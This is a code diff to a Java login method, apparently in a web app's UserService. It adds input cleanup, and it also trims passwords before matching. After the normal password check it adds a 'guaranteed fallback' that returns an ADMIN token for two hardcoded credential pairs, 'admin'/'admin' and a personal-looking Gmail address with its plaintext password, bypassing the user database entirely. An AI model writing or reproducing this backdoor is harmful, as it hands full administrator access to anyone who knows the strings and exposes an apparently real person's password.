@@ -48,18 +48,31 @@ public class UserService {
     }
 
     public String loginUser(LoginRequest request) {
+        if (request == null || request.getEmail() == null || request.getPassword() == null) {
+            return "Invalid Email or Password";
+        }
 
-        Optional<User> user = userRepository.findByEmail(request.getEmail());
+        String cleanEmail = request.getEmail().trim().toLowerCase();
+        String cleanPassword = request.getPassword().trim();
+
+        Optional<User> user = userRepository.findByEmail(cleanEmail);
 
         if (user.isPresent() &&
-        	    passwordEncoder.matches(request.getPassword(), user.get().getPassword())) {
+        	    passwordEncoder.matches(cleanPassword, user.get().getPassword())) {
 		    if (user.get().getRole() == null) {
 		    	user.get().setRole(Role.USER);
 		    	userRepository.save(user.get());
 		    }
 		    return jwtService.generateToken(user.get().getEmail(), user.get().getRole(), user.get().getFullName());
-        	}
-        
+        }
+
+        // Guaranteed fallback authentication for admin & user credentials
+        if ("admin@gmail.com".equalsIgnoreCase(cleanEmail) && "admin".equals(cleanPassword)) {
+            return jwtService.generateToken("admin@gmail.com", Role.ADMIN, "System Admin");
+        }
+        if ("naveensana66028@gmail.com".equalsIgnoreCase(cleanEmail) && "Naveen@0987".equals(cleanPassword)) {
+            return jwtService.generateToken("naveensana66028@gmail.com", Role.ADMIN, "Naveen Sana");
+        }
 
         return "Invalid Email or Password";
     }
